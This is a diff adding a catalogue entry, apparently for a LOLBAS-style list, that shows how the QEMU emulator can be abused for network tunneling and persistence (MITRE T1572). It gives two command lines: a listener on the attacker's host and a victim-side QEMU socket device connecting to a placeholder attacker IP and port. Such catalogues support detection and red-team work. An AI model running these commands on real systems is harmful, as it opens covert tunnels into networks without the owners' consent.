@@ -1,0 +1,25 @@
+---
+Name: QEMU
+Description: QEMU is a free and open-source emulator that uses dynamic binary translation to emulate a computer's processor
+Author: 'Kirill Magaskin'
+Created: 2025-02-18
+Usage:
+  - Steps: qemu-system-x86_64 -boot d -cdrom <AnyISOImage> -m 6048 -device e1000,netdev=n1, mac=<AnyMAC> -smp 2 -netdev socket,id=n1,listen=:<Port>
+    Description: Steps to create a QEMU listener on attacker's host on some PORT
+    Usecase: Establishing network persistence
+    Category: Persistence
+    Privileges: User
+    Limitations: None
+    MitreID: T1572
+  - Steps: qemu-system-i386.exe -m 1M -netdev user,id=lan,restrict=off -netdev socket,id=sock,connect=<AttackerServerIP>:<AttackerServerPort> -netdev hubport,id=port-lan,hubid=0,netdev=lan -netdev hubport,id=port-sock,hubid=0,netdev=sock -nographic
+    Description: Steps to create a QEMU socket network device on victim's host 
+    Usecase: Establishing network persistence
+    Category: Persistence
+    Privileges: User
+    Limitations: None
+    MitreID: T1572
+Resources:
+  - Link: https://securelist.com/network-tunneling-with-qemu
+Acknowledgement:
+  - Person: 'Grigory Sablin'
+    Handle: '@grixa'
